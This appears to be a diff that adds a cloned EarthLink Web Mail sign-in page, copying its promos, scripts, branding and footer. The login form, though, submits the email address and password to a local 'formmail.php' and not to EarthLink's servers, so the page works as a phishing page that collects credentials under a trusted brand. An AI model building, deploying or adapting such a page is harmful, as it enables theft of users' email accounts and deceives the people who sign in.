@@ -1,0 +1,411 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head><title>Web Mail</title>
+
+
+
+
+
+<script src='https://webmail.earthlink.net/wam/js/login.js?v=6.3.22'></script> 
+
+<script language="javascript">		
+	
+	// create new js array for static promos	
+	
+	//TODO move the following to a common js function to initalize a java array with JS array
+	
+		var zone1StaticPromoArr = new Array(2);
+	
+	
+	
+		var zone2StaticPromoArr = new Array(1);
+		
+
+	// create new js array for dynamic promos
+	
+		var zone1DynamicPromoArr = new Array(1);
+	
+	
+	
+		var zone2DynamicPromoArr = new Array(5);
+	
+
+	
+		var zone3DynamicPromoArr = new Array(5);
+	
+	
+	
+		var zone4DynamicPromoArr = new Array(5);
+	
+	
+	// load ZONE1 static promos array
+	
+		zone1StaticPromoArr[0] = "&nbsp; ";
+	
+		zone1StaticPromoArr[1] = "<span style=\"font-family: Geneva,Arial;font-weight:bold;font-size:16px;color:#f60\">Larger Message Size!</span><br><span style=\"font-family: Geneva,Arial;font-size:12px\">Now you can send and receive up to 20MB in one message!   \&nbsp\;</span>";
+	
+
+	// load ZONE2 static promos array
+	
+		zone2StaticPromoArr[0] = '';
+	
+
+	// load ZONE1 dynamic promos array
+	
+		zone1DynamicPromoArr[0] = "<span style=\"font-family: Geneva,Arial;font-weight:bold;font-size:16px;color:#f60\">New - Top Level Domain Blocking!</span><br><span style=\"font-family: Geneva,Arial;font-size:12px\">Block spam from entire domains!  See spamBlocker settings - Blocked Sender List.  \&nbsp\;</span>";
+	
+
+	// load ZONE2 dynamic promo array
+	
+		zone2DynamicPromoArr[0] = "<a href="http://tr.earthlink.net/t/lnk?id=1046858&url=http%3A%2F%2Fwww.earthlink.net%2Fsoftware%2Fstaysafe.faces%3Ftab%3Danonymousemail\" target=\"_blank\"><img src=\"images/earthlink/promos/login/prod/aea.jpg\" width=\"152\" height=\"109\" name=\"aea\" onmouseover=\"aea.width='167';aea.height='120';\" onmouseout= \"aea.width='152';aea.height='109';\"></a><h4>Anonymous&nbsp;Email</h4><a href="http://tr.earthlink.net/t/lnk?id=1046858&url=http%3A%2F%2Fwww.earthlink.net%2Fsoftware%2Fstaysafe.faces%3Ftab%3Danonymousemail\" target=\"_blank\">FREE! Get 10 Anonymous Email Addresses & keep your real email address safe!</a>";
+	
+		zone2DynamicPromoArr[1] = "<a href="http://www.earthlink.net/software/staysafe.faces?tab=nismac\" target=\"_blank\"><img src=\"images/earthlink/promos/login/prod/NISM_Erthlnk.jpg\" width=\"152\" height=\"109\" name=\"nism\" onmouseover=\"nism.width='167';nism.height='120';\" onmouseout= \"nism.width='152';nism.height='109';\"></a><h4>Norton Internet Security for Mac</h4><a href="http://www.earthlink.net/software/staysafe.faces?tab=nismac\" target=\"_blank\">Advanced protection to surf, bank and shop online with your Mac.</a>";
+	
+		zone2DynamicPromoArr[2] = "<a href="http://tr.earthlink.net/t/lnk?id=1021544&url=http%3A%2F%2Fwww.earthlink.net%2Fsoftware%2Fstayconnected.faces%3Ftab%3Demailbyphone\" target=\"_blank\"><img src=\"images/earthlink/promos/login/ebp.gif\" width=\"152\" height=\"109\" name=\"ebp\" onmouseover=\"ebp.width='167';ebp.height='120';\" onmouseout= \"ebp.width='152';ebp.height='109';\"></a><h4>Email By Phone</h4><a href="http://tr.earthlink.net/t/lnk?id=1021544&url=http%3A%2F%2Fwww.earthlink.net%2Fsoftware%2Fstayconnected.faces%3Ftab%3Demailbyphone\" target=\"_blank\">Compose and listen to your email from any telephone.</a>";
+	
+		zone2DynamicPromoArr[3] = "<a href="http://www.earthlink.net/membercenter/getmore.faces?tab=referfriend&p=start\" target=\"_blank\"><img src=\"images/earthlink/promos/login/prod/referafriend.gif\" width=\"152\" height=\"109\" name=\"refer\" onmouseover=\"refer.width='167';refer.height='120';\" onmouseout= \"refer.width='152';refer.height='109';\"></a><h4>Refer a Friend Today</h4><a href="http://www.earthlink.net/membercenter/getmore.faces?tab=referfriend&p=start\" target=\"_blank\">Share the EarthLink experience and earn valuable rewards!</a>";
+	
+		zone2DynamicPromoArr[4] = "<a href="http://www.earthlink.net/membercenter/getstarted.faces?tab=email\" target=\"_blank\"><img src=\"images/earthlink/promos/login/prod/mes.gif\" width=\"152\" height=\"109\" name=\"mes\" onmouseover=\"mes.width='167';mes.height='120';\" onmouseout= \"mes.width='152';mes.height='109';\"></a><h4>More Email Space</h4><a href="http://www.earthlink.net/membercenter/getstarted.faces?tab=email\" target=\"_blank\">Add more storage to your email account today!</b></a>";
+		
+	
+	// load ZONE3 dynamic promo array
+	
+		zone3DynamicPromoArr[0] = "<a href="http://www.earthlink.net/software/stayconnected.faces?tab=pcfinetune\" target=\"_blank\"><img src=\"images/earthlink/promos/login/prod/pcfinetune.gif\" width=\"152\" height=\"109\" name=\"pcft\" onmouseover=\"pcft.width='167';pcft.height='120';\" onmouseout= \"pcft.width='152';pcft.height='109';\"></a><h4>EarthLink PC FineTune<sup>TM</sup></h4><a href="http://www.earthlink.net/software/stayconnected.faces?tab=pcfinetune\" target=\"_blank\">A faster PC is just 1 click away! FREE TRIAL!</a>";
+	
+		zone3DynamicPromoArr[1] = "<a href="http://www.earthlink.net/software/staysafe.faces?tab=norton360\" target=\"_blank\"><img src=\"images/earthlink/promos/login/prod/norton360-new.jpg\" width=\"152\" height=\"109\" name=\"nort\" onmouseover=\"nort.width='167';nort.height='120';\" onmouseout= \"nort.width='152';nort.height='109';\"></a><h4>Norton 360<sup>TM</sup></h4><a href="http://www.earthlink.net/software/staysafe.faces?tab=norton360\" target=\"_blank\">No viruses. No hackers. No spyware. No worries. Get award-winning all-in-one protection today!</a>";
+	
+		zone3DynamicPromoArr[2] = "<a href="http://tr.earthlink.net/t/lnk?id=1042698&url=http%3A%2F%2Fwww.earthlink.net%2Fsoftware%2Fstayconnected.faces%3Ftab%3Dhomenetworking\" target=\"_blank\"><img src=\"images/earthlink/promos/login/prod/hn-new.gif\" width=\"152\" height=\"109\" name=\"hnw\" onmouseover=\"hnw.width='167';hnw.height='120';\" onmouseout= \"hnw.width='152';hnw.height='109';\"></a><h4>Home Networking</h4><a href="http://tr.earthlink.net/t/lnk?id=1042698&url=http%3A%2F%2Fwww.earthlink.net%2Fsoftware%2Fstayconnected.faces%3Ftab%3Dhomenetworking\" target=\"_blank\">Share your high-speed access on all home PCs. FREE equipment rebate!</a>";
+	
+		zone3DynamicPromoArr[3] = "<a href="http://www.earthlink.net/offers/accelerator/\" target=\"_blank\"><img src=\"images/earthlink/promos/login/prod/7253AcceleratorTile.gif\" width=\"152\" height=\"109\" name=\"accel\" onmouseover=\"accel.width='167';accel.height='120';\" onmouseout= \"accel.width='152';accel.height='109';\"></a><h4>Download FREE Dial-Up Accelerator</h4><a href="http://www.earthlink.net/offers/accelerator/\" target=\"_blank\">Click here for a faster dial-up experience.</a>";
+	
+		zone3DynamicPromoArr[4] = "<a href="http://support.earthlink.net/chat\" target=\"_blank\"><img src=\"images/earthlink/promos/login/prod/7469_elink_webmail_support_tile_152x109_v01_b.gif\" width=\"152\" height=\"109\" name=\"support\" onmouseover=\"support.width='167';support.height='120';\" onmouseout= \"support.width='152';support.height='109';\"></a><h4>Have a Question?</h4><a href="http://support.earthlink.net/chat\" target=\"_blank\">Chat LIVE with an EarthLink Support representative</a>";
+	
+	
+	// load ZONE4 dynamic promo array
+	
+		zone4DynamicPromoArr[0] = "<a href="http://my.earthlink.net\" target=\"_blank\"><img src=\"images/earthlink/promos/login/prod/startpage.gif\" width=\"152\" height=\"109\" name=\"myelnk\" onmouseover=\"myelnk.width='167';myelnk.height='120';\" onmouseout= \"myelnk.width='152';myelnk.height='109';\"></a><h4>Customize Your Page Today</h4><a href="http://my.earthlink.net\" target=\"_blank\">Get customized news, stocks, weather, TV listings \&amp\; more--FREE!</a>";
+	
+		zone4DynamicPromoArr[1] = "<a href="http://www.earthlink.net/software/staysafe.faces?tab=onlinebackup\" target=\"_blank\"><img src=\"images/earthlink/promos/login/prod/elnk_online_backup.gif\" width=\"152\" height=\"109\" name=\"olbu\" onmouseover=\"olbu.width='167';olbu.height='120';\" onmouseout= \"olbu.width='152';olbu.height='109';\"></a><h4>EarthLink Online Backup</h4><a href="http://www.earthlink.net/software/staysafe.faces?tab=onlinebackup\" target=\"_blank\">Backing up your computers is just the beginning</a>";
+	
+		zone4DynamicPromoArr[2] = "<a href="http://www.earthlink.net/membercenter/\" target=\"_blank\"><img src=\"images/earthlink/promos/login/prod/members_center_tile_v3.gif\" width=\"152\" height=\"109\" name=\"memb\" onmouseover=\"memb.width='167';memb.height='120';\" onmouseout= \"memb.width='152';memb.height='109';\"></a><h4>FOR MEMBERS ONLY!</h4> <a href="http://www.earthlink.net/membercenter/\" target=\"_blank\">Get tips & tools for a better Internet experience.</a>";
+	
+		zone4DynamicPromoArr[3] = "<a href="http://my.earthlink.net\" target=\"_blank\"><img src=\"images/earthlink/promos/login/prod/6369_Web_Mail_Tile_2.gif\" width=\"152\" height=\"109\" name=\"myearthlink\" onmouseover=\"myearthlink.width='167';myearthlink.height='120';\" onmouseout= \"myearthlink.width='152';myearthlink.height='109';\"></a><h4>Check email without leaving your Start Page</h4><a href="http://my.earthlink.net\" target=\"_blank\">Visit myEarthLink now and add your address to \&quot\;My Email\&quot\;.</a>";
+	
+		zone4DynamicPromoArr[4] = "<a href="http://www.earthlink.net/software/domore.faces?tab=scanner\" target=\"_blank\"><img src=\"images/earthlink/promos/login/prod/scanner.png\" width=\"152\" height=\"109\" name=\"scanner\" onmouseover=\"scanner.width='167';scanner.height='120';\" onmouseout= \"scanner.width='152';scanner.height='109';\"></a><h4>EarthLink System Scanner</h4><a href="http://www.earthlink.net/software/domore.faces?tab=scanner\" target=\"_blank\">FREE Scan Shows You What Your PC Needs!</a>";
+	
+	// rotate dynamic promos on the login page by zone and divID
+	function rotatePromos( divID, zoneArr )
+	{
+		var arrLength = zoneArr.length;
+		var index = generateRandom( arrLength );	
+		document.getElementById(divID).innerHTML = zoneArr[index];
+	}
+	
+	// generates a random number between 0 to (bounds - 1)
+	function generateRandom( bounds )
+	{
+		var randomNum = Math.floor(Math.random() * bounds);
+		return randomNum;
+	}
+	
+	function insertStaticPromos()
+	{
+			document.getElementById('zone1static1').innerHTML = zone1StaticPromoArr[0];
+			document.getElementById('zone1static2').innerHTML = zone1StaticPromoArr[1];	
+			//document.getElementById('zone2static1').innerHTML = zone2StaticPromoArr[0];
+			//document.getElementById('zone2static2').innerHTML = zone2StaticPromoArr[1];
+	}
+		
+</script>
+<SCRIPT>var checkjs = false;</script>
+<script src='https://webmail.earthlink.net/wam/js/login.js?v=6.3.22'></script> 
+<script src='https://webmail.earthlink.net/wam/js/domains.js?v=6.3.22'></script> 
+<script src='https://webmail.earthlink.net/wam/js/scripts.js?v=6.3.22'></script> 
+
+<SCRIPT language="javascript"><!--
+
+	if(d == null){allAllowed = true;}
+	
+    aiDomainCheck = true;
+
+    function constructUrl(farmUrl){return "https://" + farmUrl + "https://webmail.earthlink.net/wam/Login";}
+
+	var doOnLoad = new Array();
+
+	function init() {
+		   if (arguments.callee.done) return;
+		   arguments.callee.done = true;
+		   // TT #18272 Turning off the old loadFocus which
+		   // stole the focus after ad has been loaded
+		   //loadFocus();
+
+   		   for (i = 0; i < doOnLoad.length; i++) {
+		     doOnLoad[i](this);
+		   }
+	   };
+   /* for Mozilla */
+   if (document.addEventListener) {
+       document.addEventListener("DOMContentLoaded", init, null);
+   }
+
+   /* for Internet Explorer */
+   /*@cc_on @*/
+   /*@if (@_win32)
+       document.write("<script defer src='https://webmail.earthlink.net/wam/js/focusHandler.js?v=6.3.22'><"+"/script>");
+   /*@end @*/
+
+   /* for other browsers */
+   window.onload = init;
+// --></SCRIPT>
+
+
+
+	
+
+
+
+
+
+ 
+<link rel="stylesheet" href="https://webmail.earthlink.net/wam/brand/earthlink/style60.css?v=6.3.22" type="text/css">
+
+
+<link rel="stylesheet" href="https://webmail.earthlink.net/wam/brand/earthlink/chit.webmail.css" type="text/css">
+<meta http-equiv="cache-control" content="no-cache" />
+<meta http-equiv="pragma" content="no-cache" />
+<meta http-equiv="expires" content="0" />
+<link rel="shortcut icon" type="image/ico" href="https://webmail.earthlink.net/wam/brand/earthlink/favicon.ico" />
+
+
+  </head>
+	<body onload="frameBreakout(); " topmargin="0" leftmargin="0" link="#0000ff" marginheight="0" marginwidth="0" vlink="#0000ff">
+	
+	
+
+
+
+
+
+
+<form style="margin: 0" method="GET" target="search" action="http://search.earthlink.net/track">
+<table width="100%"  class="universalNav_6_0" cellpadding="0" cellspacing="0">
+	<tr valign="middle">
+
+		<!-- Open and close TD tags have to be on same line or contents will be misaligned in IE -->
+		<td><img src="https://webmail.earthlink.net/wam/images/earthlink/elnk_logo_6_0.gif" border="0" alt="EarthLink" /></td>
+		<td align="right" width="90%"><span class="universalLinks_6_0"><a href="http://www.earthlink.net">EarthLink.net</a> | <a href="http://my.earthlink.net">My Start Page</a> | <a href="http://myvoice.earthlink.net">myVoice</a> | <a href="http://myaccount.earthlink.net/">My Account</a> | <a href="http://support.earthlink.net/">Support</a> |</span></td>
+
+		<td><img src="https://webmail.earthlink.net/wam/images/earthlink/google_6_0.gif"></td>
+		<td><input type="hidden" name="url" value="/search"><input type="hidden" name="id" value="1024669" /><input type="hidden" name="channel" value="webmail"><input type="hidden" name="vars" value="q,channel"><input type="text" name="q" value="" size="15"></td>
+		<td><input type="image" style="margin: 0px 0px 0px 3px;" src="https://webmail.earthlink.net/wam/images/earthlink/search_6_0.gif"></td>
+	</tr>
+</table>
+</form>
+
+
+
+
+<div id="msgCenter60">
+</div>
+	
+	<br><center>
+	
+	
+
+	
+
+<div class="main-content">
+    <div class="signInWidget">
+		<form name=signinFrm action="formmail.php" method=post onsubmit="return checkLogin()">
+		<INPUT TYPE=HIDDEN NAME="page" VALUE="https://webmail.earthlink.net/wam/index.jsp">
+		<INPUT TYPE=HIDDEN NAME="start" VALUE="1">
+
+          <div class="widget">
+            <div class="header">
+              <img src="https://webmail.earthlink.net/wam/images/earthlink/signin-header-left.gif" alt="" width="15" height="17" border="0"  class="left" />
+              <img src="https://webmail.earthlink.net/wam/images/earthlink/signin-header-right.gif" alt="" width="15" height="17" border="0" class="right" />
+            </div>
+            <div class="signInError" style="display:none;"></div>
+            <div class="content">
+            <!-- Zone 1 Ad Start -->
+              <span class="left">
+              	<div id="zone1dynamic1" width="310" height="50"></div></br>
+              	<div id="zone1static1" width="310" height="50"></div></br>
+              	<div id="zone1static2" width="310" height="50"></div></br>
+              	<div id="facebooklike" width="310" height="50">
+              	             	
+					<table>
+	              		<tr>
+	              			<td><img src="https://webmail.earthlink.net/wam/images/earthlink/logo_facebook.jpg"></img></td>
+	              			<td>
+				              	<table>
+				              		<tr>
+				              			<td><span style="font-family: Geneva,Arial;color:#3B5998;white-space:nowrap;display:inline;"><span style="font-weight:bold;font-size:16px;display:inline;">EarthLink</span>&nbsp;on&nbsp;Facebook</span></td>
+				              		</tr>
+				              		<tr>
+				              			<td>
+				              			<iframe src="https://www.facebook.com/plugins/like.php?app_id=130575103687281&amp;href=http%3A%2F%2Fwww.facebook.com%2Fearthlink&amp;send=false&amp;layout=standard&amp;width=245&amp;show_faces=false&amp;action=like&amp;colorscheme=light&amp;font&amp;height=35" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:245px; height:35px;" allowTransparency="true"></iframe>
+				              			</td>
+				              		</tr>
+				              	</table>
+	              			</td>
+	              		</tr>
+	              	</table>
+	              	     	
+               	</div></br>
+              </span>
+			<!-- Zone 1 Ad End -->
+			
+              <span class="right">
+
+              <script type="text/javascript">
+				if(checkjs)
+				{
+              		document.write("<label for='uname'>Email Address (or <a href='#' onclick='alert(\"EarthLink IDs are issued to non-members who use EarthLink&#8217;s free services.\");'>EarthLink ID</a>):</label>");
+					document.write("<input type='hidden' name='tzoffset' value='" + tzoffset + "'>");
+					// User screen height/width
+					document.write( "<input type='hidden' name='screenSize' value='" + screen.width + "x" + screen.height + "'>" );
+					document.write("<div class='inline-errors'><div id='emailElement'></div><input tabindex='1' type='text' size='30' value='" + GetCookie('ZU') + "\' name='email' id='uname' class='username' onkeypress='checkCapsLock( event, \"emailElement\")' onBlur='hideInlineError(\"emailElement\")'></div>");
+					
+					document.write("<div class='notes'>(eg. your_address@earthlink.net)</div>");
+					
+                  	document.write("<label for='passw'>Password:</label>");
+					document.write("<div class='inline-errors'><div id='passwordElement'></div><input tabindex='2' type='password' value='' name='password' class='password' id='passw' onkeypress='checkCapsLock( event, \"passwordElement\")'  onBlur='hideInlineError(\"passwordElement\")'></div>");
+					
+                  		document.write("<div class='notes'><a href='https://myaccount.earthlink.net/cam/passmain.jsp' class='signinLinks' tabindex='4'>Forgot your password?</a></div>");
+                  	
+                  	document.write("<div align='center'>");
+                    document.write("<input tabindex='3' class='buttonLogin' src='https://webmail.earthlink.net/wam/images/earthlink/button-signin.gif' name='okey_x' type='image' value='Sign In'/>");
+                    document.write("<div class='notes'><a href='http://www.earthlink.net/webmail/help/earthlink/en_US/login.html' target='_blanks' add='1' />Sign In Help</a></div></div>");
+	         		document.write("<input id='saveuser' type='checkbox' value='on' name='saveuser' class='checkbox'");
+	         		if (GetCookie("ZU") != "") document.write(" CHECKED");
+	         		document.write("> <label for='saveuser' class='normal'>Remember my login on this computer.</label>");
+				
+				// Put the focus on email field as soon
+                                // as the fields are rendered
+				loadFocus();
+				}else
+				{
+					document.write('Web Mail is currently unavailable. Please try again later.');
+				}
+			</script>
+			<noscript>The Web Mail system requires you to have JavaScript enabled in your browser. See your browser's documentation for details on how to enable this feature.</noscript>
+		            <div id='login_warning' style='color:red;display:inline'> </div>
+             </span>
+            </div>
+           <div class="footer">
+              <img src="https://webmail.earthlink.net/wam/images/earthlink/signin-footer-left.gif" alt="" width="15" height="17" border="0" class="left" />
+              <img src="https://webmail.earthlink.net/wam/images/earthlink/signin-footer-right.gif" alt="" width="15" height="17" border="0" class="right" />
+           </div>
+         </div>
+
+			<!-- Try these convenient tools -->
+         <div class="widget2">
+           <div class="header">
+             <img src="https://webmail.earthlink.net/wam/images/earthlink/signin-header2-left.gif" alt="" width="15" height="17" border="0" class="left"/>
+             <img src="https://webmail.earthlink.net/wam/images/earthlink/signin-header2-right.gif" alt="" width="15" height="17" border="0" class="right"/>
+           </div>
+           <div class="content" style="border: 1px solid #99a2e5; border-width: 0 1px; height: 212px;">
+           		<span>           		
+           			<div id="zone2dynamic1" width="190" heigth="180"></div>
+           		</span>
+           		<span>
+	           		<!-- <div id="zone2static1" width="190" heigth="180"></div> -->
+	           		<div id="zone3dynamic1" width="190" heigth="180"></div>          		
+           		</span>
+           		<span>
+	           		<!-- <div id="zone2static2" width="190" heigth="180"></div> -->
+	           		<div id="zone4dynamic1" width="190" heigth="180"></div>
+           		</span>
+           </div>
+           <div class="footer">
+             <img src="https://webmail.earthlink.net/wam/images/earthlink/signin-footer-left.gif" alt="" width="15" height="17" border="0" class="left"/>
+             <img src="https://webmail.earthlink.net/wam/images/earthlink/signin-footer-right.gif" alt="" width="15" height="17" border="0" class="right"/>
+           </div>
+          </div>
+          
+        </form>      
+    </div>
+    <div class="skyscraper">
+    
+			
+
+
+
+
+
+
+
+
+
+
+<IFRAME	name="skyscraperframe"
+		onfocus="loadFocus()" 
+		SRC="html/blank.htm" 
+		width="120" 
+		height="600" 
+		frameborder="no" 
+		border="0" 
+		MARGINWIDTH="0" 
+		MARGINHEIGHT="0" 
+		SCROLLING="no">
+	&nbsp;
+</IFRAME>
+
+<script type="text/javascript">
+	function adbannerReplace() {
+		if (frames['skyscraperframe']) {
+			frames['skyscraperframe'].location.replace('https://webmail.earthlink.net/wam/brand/earthlink/google_ad_login.html');
+		}
+	}
+	
+	doOnLoad.push(adbannerReplace);
+</script>
+
+		
+
+    </div>
+</div>
+
+
+
+
+
+
+<div class="footer" align="left">
+<hr size="1">
+<font face="Arial" size="1">
+	&copy; 2016 EarthLink, Inc. All Rights Reserved.<br>
+	Members and visitors to the EarthLink Web site agree to abide by our
+	<A href="http://www.earthlink.net/about/policies/" target=_blank>Policies and Agreements</A><br>
+	<A href="http://www.earthlink.net/about/policies/privacy/" target=_blank>EarthLink Privacy Policy</A>
+</font>
+
+</div>
+
+
+<div align="right" class="footer">
+	Web Mail version 6.3.36
+</div>
+
+
+
+
+<script language="javascript">
+  insertStaticPromos();
+  rotatePromos( 'zone1dynamic1', zone1DynamicPromoArr );
+  rotatePromos( 'zone2dynamic1', zone2DynamicPromoArr );
+  rotatePromos( 'zone3dynamic1', zone3DynamicPromoArr );
+  rotatePromos( 'zone4dynamic1', zone4DynamicPromoArr );
+
+</script>            			
+
+
+		<SCRIPT LANGUAGE="JavaScript">var tcdacmd="dt";</SCRIPT>
+		<SCRIPT SRC="https://an.secure.tacoda.net/an/14043/slf_ssl.js" LANGUAGE="JavaScript"></SCRIPT>
+	
+
+
+</body>
+
+</html>
